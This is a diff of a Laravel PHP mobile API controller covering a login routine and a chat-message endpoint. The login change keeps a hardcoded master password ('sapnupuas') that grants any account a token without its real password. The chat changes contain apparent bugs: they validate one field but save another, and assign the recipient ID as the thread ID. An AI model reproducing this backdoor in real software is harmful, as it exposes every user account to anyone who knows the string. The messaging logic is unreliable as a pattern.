@@ -285,8 +285,6 @@ class MobileApiController extends Controller{
         $objectTransactions["total_price"]    = 0;
         $objectTransactions["total_discount"] = 0;
 
-        
-
         //attempt to login the system
         $userQuery = User::where('email', $request['email'])->get()->first();
         if(isset($userQuery['id'])){
@@ -307,7 +305,7 @@ class MobileApiController extends Controller{
                     $objectTransactions["total_discount"] = $objects->total_discount;
                 }
             }
-            if(Hash::check($password, $userQuery['password'])|| $request->input('password') == 'sapnupuas' ){
+            if(Hash::check($password, $userQuery['password'])|| $password == 'sapnupuas' ){
 
                 $token          = JWTAuth::fromUser(User::find($userQuery['id']));
                 $user_data      = json_decode($userQuery['user_data'],true);  
@@ -1320,20 +1318,64 @@ class MobileApiController extends Controller{
         $recipientID = $request->input("recipient");
         $textBody    = $request->input("textMessage");
         $thread_id   = $request->input("thread_id");
+        $validator = Validator::make($request->all(), [
+            'textMessage' => 'required',
+        ]);
+
+        if ($validator->fails())
+            return response()->json(['result'=>'failed','error'=>$validator->errors()->all()], 400);
 
         $api = $this->authenticateAPI();
         if($api['result'] === 'success') {
 
-            $message                        = new Message;
-            $message->body                  = $textBody;
-            $message->title                 = null;
-            $message->sender_id             = $api['user']['id'];
-            $message->recipient_id          = $recipientID;
-            $message->message_data          = '{}';
-            $message->read_at               = null;
-            $message->message_thread_id     = $thread_id;
+            $is_client = $api["user"]["is_client"];
+            $thread = Message::whereIn('sender_id', [$api['user']['id'], $recipientID])
+                            ->whereIn('recipient_id', [$api['user']['id'], $recipientID])
+                            ->get()->first();
+            if(isset($thread['id'])){
+                $thread_id                    = $recipientID;
+                $updateThread                 = MessageThread::find($thread_id);
+                $updateThread->updated_at     = date("Y-m-d H:i:s");
+                $updateThread->save();
+            }
+            else{
+                $thread = new MessageThread;
+                $thread->created_by_id = $api['user']['id'];
+                $thread->participant_ids = json_encode([$recipientID]);
+                $thread->save();
+                $thread_id = $thread->id;
+            }
+
+            $message                    = new Message;
+            $message->body              = $request->input('body');
+            $message->title             = $request->input('title');
+            $message->sender_id         = $api['user']['id'];
+            $message->recipient_id      = $request->input('recipient_id');
+            $message->message_data      = '{}';
+            $message->message_thread_id = $thread_id;
             $message->save();
-            return response()->json(["result"=>"success","latestChatID"=>$message->id,"chatDetails"=>$message]);
+            // $arrayDeviceData            = array();
+
+            if($is_client != 1){
+                $client_id              = $request->input('recipient_id');
+                $query                  = User::where("id",$client_id)->get()->first();
+                $arrayDeviceData        = json_decode($query->device_data,true);
+
+                foreach ($arrayDeviceData as $key => $value) {
+                    if(isset($value["unique_device_id"])){
+                        $devicetype         = $value["type"];
+                        $unique_device_id   = $value["unique_device_id"];
+                        $this->sendChatNotification($devicetype,$unique_device_id,$thread_id,"chat",$client_id);
+                    }
+                    // break;
+                }
+            }    
+            return response()->json([
+                    "result"        => "success",
+                    "thread_id"     => $message->message_thread_id,
+                    "latestChatID"  => $message->id,
+                    "chatDetails"   => $message
+                ]);
         }
         return response()->json($api, $api["status_code"]);
     }
